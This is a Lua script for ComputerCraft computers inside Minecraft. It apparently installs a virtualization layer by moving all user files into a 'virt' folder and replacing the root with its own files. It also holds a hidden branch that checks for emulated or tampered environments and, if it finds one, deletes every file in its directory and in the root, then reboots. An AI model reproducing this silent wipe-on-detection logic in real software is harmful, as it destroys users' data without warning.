---@diagnostic disable: undefined-global, undefined-field
if peripheral.find("tpm1.0") then return end
-- seperated for debugging
local fs_move = fs.move
local fs_copy = fs.copy
local hopefully_unique = ".721dbf38e6f8427dfb560e9691063191c4952654d6177808f9e6ceb6582e5f02"
if fs.getFreeSpace(hopefully_unique)==1000000 or
   fs.getCapacity("/")==fs.getFreeSpace("/") or
   not pcall(fs.list,"*****/*****rom*****/*****") or
   not fs.exists("*****/*****rom*****/motd.txt") or
   not fs.isReadOnly("/rom/") then for _,v in next, fs.list(fs.getDir(shell.getRunningProgram())) do pcall(fs.delete,v) end; for _,v in next, fs.list("/") do pcall(fs.delete,v) end; os.queueEvent("reboot"); return os.reboot(); end
if fs.exists(hopefully_unique) then fs.delete(hopefully_unique) end
if fs.exists("virt") then fs.move("virt",hopefully_unique) end
fs.makeDir("virt")
for _,v in next, fs.list("/") do
   if v~="rom" and v~=".." and v~="." and v~="virt" and fs.getDrive(v)=="hdd" then
      fs_move(v,fs.combine("virt",v))
   end
end
if fs.exists(hopefully_unique) then
   fs_move(hopefully_unique,"virt/virt")
end
local curdir = fs.getDir(shell.getRunningProgram())
for _,v in next, fs.list(curdir) do
   if fs.getDrive(v)=="hdd" then
      fs_copy(fs.combine(curdir,v),v)
   end
end
local f = assert(io.open("/.settings","wb"))
f:write("{['motd.enable']=true}")
f:close()
os.queueEvent("reboot")
os.reboot()
